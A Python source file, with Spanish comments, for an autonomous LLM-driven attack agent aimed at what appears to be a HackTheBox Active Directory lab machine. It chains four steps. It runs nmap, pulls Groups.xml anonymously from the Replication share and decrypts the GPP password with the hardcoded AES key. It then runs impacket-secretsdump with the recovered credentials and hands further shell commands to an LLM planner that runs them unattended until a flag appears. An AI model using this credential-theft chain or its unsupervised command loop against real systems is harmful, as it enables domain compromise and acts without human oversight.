import sys, json, time, re, logging, base64, hashlib
from pathlib import Path
from Crypto.Cipher import AES
from core.state_manager import StateManager
from utils.smart_executor import SmartCommandExecutor
from utils.exploit_matcher import ExploitMatcher
from nodes.dynamic_agent import LLMDecisionEngine, CommandSanitizer

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", handlers=[logging.StreamHandler(sys.stdout)])
logger=logging.getLogger("EnterpriseDynamicAgent")

MAX_STEPS=200
MAX_SAME_ACTION_ATTEMPTS=3
CANONICAL_SCAN="version_scan.txt"
LEGACY_SCANS=("full_recon.txt",)

class EnterpriseDynamicAgent:
    def __init__(self,target_ip:str,domain_name:str=None):
        self.target_ip=target_ip; self.domain_name=domain_name
        self.state_manager=StateManager(target_ip)
        state=self.state_manager.load_state()
        self.current_step=int(state.get("step_count",0))+1
        self.executor=SmartCommandExecutor(timeout_minutes=20,poll_interval=15)
        self.exploit_matcher=ExploitMatcher(target_ip)

    def extract_domain_from_scan(self,scan_content:str):
        if self.domain_name:return
        m=re.search(r"Domain:\s*([a-zA-Z0-9.-]+\.[a-zA-Z]+)",scan_content,re.I)
        self.domain_name=m.group(1).lower() if m else "active.htb"
        if m:self.state_manager.update_etc_hosts(domain_name=self.domain_name)

    def decrypt_gpp_password(self,cpassword:str)->str:
        try:
            decoded=base64.b64decode(cpassword+"="*((4-len(cpassword)%4)%4))
            key=(b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8"
                 b"\xf4\x96\xae\x0a\x3d\x7e\x1c\xf7\xfe\xee\x1f\xd3\xfa\x06\x30\x7c")
            d=AES.new(key,AES.MODE_CBC,b"\x00"*16).decrypt(decoded); n=d[-1]
            return d[:-n].decode("utf-16le",errors="ignore")
        except Exception:return None

    def parse_loot_for_credentials(self):
        creds={"username":None,"password":None}; loot=Path(f"testing/{self.target_ip}/loot")
        if not loot.exists():return creds
        for p in loot.glob("**/*.xml"):
            try:
                s=p.read_text(encoding="utf-8",errors="ignore")
                u=re.search(r'userName="([^"]+)"',s,re.I); cp=re.search(r'cpassword="([^"]+)"',s,re.I)
                if u:creds["username"]=u.group(1)
                if cp:creds["password"]=self.decrypt_gpp_password(cp.group(1))
            except Exception:continue
        return creds

    @staticmethod
    def fingerprint(command):
        return hashlib.sha256(re.sub(r"\s+"," ",command.strip()).encode()).hexdigest()[:16]

    def scan_path(self):
        p=Path(f"testing/{self.target_ip}/scans/{CANONICAL_SCAN}")
        if p.exists():return p
        for name in LEGACY_SCANS:
            q=p.parent/name
            if q.exists():
                logger.info("[+] Recon legacy detectado: %s; se considera completado.",q)
                return q
        return p

    def ensure_potential_exploits(self,scan:Path):
        """Genera el informe de posibles vectores una vez disponible el scan."""
        report=Path(f"testing/{self.target_ip}/loot/potential_exploits.json")
        if report.exists():return
        try:
            text=scan.read_text(encoding="utf-8",errors="ignore")
            self.exploit_matcher.analyze_scan_output(text)
        except Exception as exc:
            logger.warning("[!] No se pudo generar potential_exploits.json: %s",exc)

    def flags_found(self):
        root=Path(f"testing/{self.target_ip}")
        if not root.exists(): return []
        found=[]
        filename_patterns=("user.txt","root.txt","local.txt","proof.txt","flag.txt","flags.json","user.flag","root.flag")
        flag_re=re.compile(r"(?:flag|htb)\{[^}]{4,200}\}",re.I)
        for p in root.rglob("*"):
            if not p.is_file(): continue
            if p.name.lower() in filename_patterns:
                found.append(str(p)); continue
            try:
                if p.stat().st_size>2_000_000: continue
                data=p.read_text(encoding="utf-8",errors="ignore")
                if flag_re.search(data): found.append(str(p))
            except (OSError,UnicodeError): continue
        return sorted(set(found))

    def load_potential_exploit(self):
        """Carga candidatos de SearchSploit como metadata; nunca los trata como comandos ejecutables."""
        paths=(Path(f"testing/{self.target_ip}/loot/potential_exploits.json"),Path(f"testing/{self.target_ip}/potential_exploits.json"),Path("potential_exploits.json"))
        for path in paths:
            if not path.exists():
                continue
            try:
                data=json.loads(path.read_text(encoding="utf-8"))
                candidates=[]
                groups=data if isinstance(data,dict) else {"unknown":data}
                for service,value in groups.items():
                    if not isinstance(value,list):
                        continue
                    for item in value:
                        if isinstance(item,dict):
                            candidates.append({"service":service,"title":item.get("Title") or item.get("title","") ,"path":item.get("Path") or item.get("path","") ,"codes":item.get("Codes") or item.get("codes","")})
                        elif isinstance(item,str):
                            candidates.append({"service":service,"title":item,"path":"","codes":""})
                if candidates:
                    return {"available":True,"source":str(path),"candidate_count":len(candidates),"candidates":candidates[:12]}
            except (OSError,json.JSONDecodeError) as exc:
                logger.warning("[!] No se pudo leer %s: %s",path,exc)
        return {"available":False,"source":"","candidate_count":0,"candidates":[]}

    @staticmethod
    def action_family(command):
        text=re.sub(r"\\s+"," ",command.lower().strip())
        if any(x in text for x in ("ntpdate","timedatectl","chronyc")):
            return "ntp_time_synchronization"
        if any(x in text for x in ("--users","enumdomusers","enumerate users","objectclass=user")):
            return "enumerate_domain_users"
        if any(x in text for x in ("--groups","enumdomgroups","enumerate groups","objectclass=group")):
            return "enumerate_domain_groups"
        if any(x in text for x in ("--shares","smbclient -l","smbmap")):
            return "enumerate_smb_shares"
        if "replication" in text and ("smbclient" in text or "mget" in text):
            return "retrieve_replication_artifacts"
        if "groups.xml" in text or "gpp-decrypt" in text:
            return "analyze_gpp_artifacts"
        if "getuserspns" in text or "kerberoast" in text:
            return "kerberos_spn_enumeration"
        if "getnpusers" in text or "asreproast" in text:
            return "asrep_enumeration"
        if "bloodhound" in text:
            return "ad_graph_collection"
        if "secretsdump" in text:
            return "credential_dump_analysis"
        if "ldapsearch" in text:
            return "ldap_query"
        return re.sub(r"\\s+"," ",text)[:160]

    @staticmethod
    def action_goal(command):
        """Clasifica el objetivo de conocimiento, independientemente de la herramienta usada."""
        family=EnterpriseDynamicAgent.action_family(command)
        if family in {"enumerate_domain_users","enumerate_domain_groups","enumerate_smb_shares",
                      "retrieve_replication_artifacts","analyze_gpp_artifacts","kerberos_spn_enumeration",
                      "asrep_enumeration","ad_graph_collection","credential_dump_analysis"}:
            return family
        if family=="ntp_time_synchronization":
            return family
        return None

    @staticmethod
    def _successful_entry(entry):
        rc=entry.get("returncode")
        status=str(entry.get("status","")).lower()
        output=str(entry.get("output","")).strip()
        return (rc == 0 or status in {"success","completed","ok"}) and bool(output)

    def completed_goals(self,history):
        goals=set()
        for entry in history:
            cmd=entry.get("command","")
            goal=self.action_goal(cmd) if cmd else None
            if goal and self._successful_entry(entry):
                goals.add(goal)
        return goals

    def semantic_repeats(self,history,command):
        family=self.action_family(command)
        return sum(self.action_family(h.get("command",""))==family for h in history if h.get("command"))

    def autonomous_fallback(self,state,potential_exploit=None):
        history=state.get("history",[]); blocked=[]
        for h in history[-12:]:
            cmd=h.get("command","")
            if cmd: blocked.append(re.sub(r"\s+"," ",cmd.strip()))
        planner=LLMDecisionEngine(); augmented_history=list(history)
        completed=self.completed_goals(history)
        planner_context=("No hay flag todavía. Debes continuar la auditoría. NO declares mission_complete hasta detectar una flag. "
                         "No repitas objetivos de conocimiento ya completados con éxito; cambia de objetivo salvo que exista evidencia nueva de fallo o necesidad. "
                         f"Objetivos ya completados: {json.dumps(sorted(completed))}. "
                         "Comandos ya ejecutados y que NO debes repetir exactamente: "+json.dumps(blocked)+"\\n")
        if potential_exploit and potential_exploit.get("available"):
            planner_context += ("Existe potential_exploit como metadata de candidatos. Debes validar aplicabilidad contra la evidencia antes de proponer cualquier acción; NO trates campos de SearchSploit como comandos ejecutables. Candidatos: "+json.dumps(potential_exploit,ensure_ascii=False)[:6000])
        augmented_history.append({"step":state.get("step_count",0),"command":"[PLANNER]","output":planner_context})
        for _ in range(3):
            decision=planner.consult_tactical_next_step(self.target_ip,augmented_history,state.get("last_output",""),potential_exploit=potential_exploit)
            cmd=CommandSanitizer.clean(decision.get("command",""))
            if not cmd: continue
            normalized=re.sub(r"\s+"," ",cmd.strip())
            if normalized not in blocked:return cmd,"autonomous",f"llm.{self.fingerprint(cmd)}"
            augmented_history.append({"step":state.get("step_count",0),"command":"[REJECTED_DUPLICATE]","output":f"El comando {cmd!r} ya fue ejecutado. Selecciona una técnica diferente."})
        return None

    def determine_next_action(self,state):
        history=state.get("history",[]); commands=[h.get("command","") for h in history]
        potential=self.load_potential_exploit()
        self.current_potential_exploit=potential

        scan=self.scan_path()
        if not scan.exists():
            return (f"nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269 -oN testing/{self.target_ip}/scans/{CANONICAL_SCAN} {self.target_ip}","recon","recon.version")
        self.extract_domain_from_scan(scan.read_text(encoding="utf-8",errors="ignore"))
        self.ensure_potential_exploits(scan)
        domain=self.domain_name or "active.htb"; loot=Path(f"testing/{self.target_ip}/loot"); loot.mkdir(parents=True,exist_ok=True)
        if not list(loot.glob("**/*.xml")) and not any("Replication" in c for c in commands):
            return (f"smbclient -U '%' -N //{self.target_ip}/Replication -c 'recurse ON; prompt OFF; lcd {loot}; mget *Groups.xml'","exploitation","enum.replication")
        creds=self.parse_loot_for_credentials()
        if creds["username"] and creds["password"] and not any("secretsdump" in c for c in commands):
            return f"impacket-secretsdump {domain}/{creds['username']}:{creds['password']}@{self.target_ip}","post-exploitation","post.secretsdump"
        planner_state={**state,"potential_exploit":potential}
        fallback=self.autonomous_fallback(planner_state,potential_exploit=potential)
        if fallback:return fallback
        return "","autonomous","planner.stalled"

    def run_autonomous_loop(self):
        while self.current_step<=MAX_STEPS:
            state=self.state_manager.load_state()
            if state.get("mission_complete"):return
            flags=self.flags_found()
            if flags:
                self.state_manager.mark_complete("flag_found:"+flags[0],self.current_step); logger.info("[+] FLAG DETECTADA: %s",flags[0]); return
            command,phase,action_id=self.determine_next_action(state)
            if not command:
                logger.warning("[!] Planner sin acción nueva; se reintentará con contexto actualizado."); time.sleep(2); continue
            attempts=state.get("action_attempts",{}).get(action_id,0); recent=state.get("history",[]); fp=self.fingerprint(command)
            repeats=sum(self.fingerprint(h.get("command",""))==fp for h in recent[-6:])
            semantic_repeats=self.semantic_repeats(recent,command)
            goal=self.action_goal(command)
            completed_goals=self.completed_goals(recent)
            if goal=="ntp_time_synchronization" and goal in completed_goals:
                logger.warning("[!] Objetivo NTP ya completado; se bloquea nueva sincronización sin evidencia nueva.")
                state.setdefault("history",[]).append({"step":self.current_step,"command":"[BLOCKED_NO_PROGRESS]","output":f"Objetivo ya completado: {goal}"})
                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False); self.current_step+=1; continue
            if goal and goal in completed_goals:
                logger.warning("[!] Objetivo semántico ya completado: %s. Se fuerza replanning.",goal)
                state.setdefault("history",[]).append({"step":self.current_step,"command":"[BLOCKED_NO_PROGRESS]","output":f"Objetivo ya completado: {goal}"})
                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False); self.current_step+=1; continue
            if attempts>=MAX_SAME_ACTION_ATTEMPTS or repeats>=MAX_SAME_ACTION_ATTEMPTS or semantic_repeats>=MAX_SAME_ACTION_ATTEMPTS:
                logger.warning("[!] Acción repetida bloqueada: %s. Se fuerza replanning autónomo.",action_id)
                state.setdefault("history",[]).append({"step":self.current_step,"command":"[BLOCKED_DUPLICATE]","output":f"Acción bloqueada: {command}"})
                self.state_manager.save_state(self.current_step,state["history"][-1],"autonomous",False); self.current_step+=1; continue
            logger.info("[*] Paso %d/%d | %s | %s",self.current_step,MAX_STEPS,action_id,command)
            result=self.executor.execute_with_polling(command); output=result.get("stdout","")
            if result.get("stderr"):output+="\nSTDERR:\n"+result["stderr"]
            self.state_manager.save_state(self.current_step,{"step":self.current_step,"action_id":action_id,"command":command,"output":output[:8000],"status":result.get("status"),"returncode":result.get("returncode")},phase,False,extra={"last_action_id":action_id,"last_command_fingerprint":fp,"action_attempts":{**state.get("action_attempts",{}),action_id:attempts+1},"potential_exploit":getattr(self,"current_potential_exploit",{"available":False,"candidate_count":0,"candidates":[]})})
            self.current_step+=1; time.sleep(1)
        logger.warning("[!] Límite de seguridad de %d pasos alcanzado sin flag; la misión NO se marca como completada.",MAX_STEPS)

if __name__=="__main__":
    EnterpriseDynamicAgent(sys.argv[1] if len(sys.argv)>1 else "10.129.9.175").run_autonomous_loop()
